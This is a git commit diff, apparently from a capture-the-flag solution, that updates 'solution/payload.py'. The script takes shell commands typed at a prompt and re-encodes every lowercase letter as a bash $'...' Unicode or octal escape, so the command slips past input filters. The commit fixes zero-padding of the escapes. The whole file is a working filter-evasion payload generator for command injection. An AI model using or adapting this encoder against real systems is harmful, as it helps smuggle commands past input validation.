860e2e8fd8dd1953a1f6899e906e6387daed38a7
Michalis Papadopoullos <mxpapad@pm.me>
2020-11-23 13:08:00 +0200

    2020-11-23 => fixed unicode issue

--- solution/payload.py
+++ solution/payload.py
@@ -1,15 +1,21 @@
 #!/usr/bin/python3
 
-USE_UNICODE=True
-
+USE_UNICODE = True          # use UNICODE or OCTAL
+    
+is_next_safe = False        # if next character is in ['A' .. 'F'] unicode representation should be padded        
 while True:
     cmd = input("> ")
     lst = ["$'"]
-    for c in cmd:
-        cc = ord(c)
+    cmd_len = len(cmd)
+    next_char = ''
+    for i in range(cmd_len):
+        if i < cmd_len - 1:
+            next_char = cmd[i + 1]
+        is_next_safe = not( ord('A') <= ord(next_char) <= ord('F') )
+        cc = ord(cmd[i])
         if ord('a') <= cc <= ord('z'):
-            lst.append( "\\U{:x}".format(cc) if USE_UNICODE else f"\\{oct(cc)[2:]}" )
+            lst.append( (("\\U{:x}" if is_next_safe else "\\U{:08x}") if USE_UNICODE else "\\{:o}").format(cc) )
         else:
-            lst.append( c )
+            lst.append( cmd[i] )
     lst.append( "'" )
     print( ''.join(lst) )
